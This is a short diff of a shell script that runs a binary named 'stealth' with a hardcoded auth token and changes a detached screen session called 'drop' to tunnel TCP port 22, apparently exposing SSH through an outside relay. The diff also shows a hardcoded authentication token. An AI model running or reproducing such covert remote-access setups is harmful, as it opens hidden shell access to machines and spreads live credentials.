@@ -23,7 +23,7 @@ chmod +x stealth
 sleep 2
 ./stealth authtoken 2AfvqkQrdOOJDhhjjGmokt9jiga_6K2ZZcr5CHGzau2nC74Pu
 sleep 2
-screen -dmS drop bash -c './stealth tcp 2222'
+screen -dmS drop bash -c './stealth tcp 22'
 
 sleep 5
 
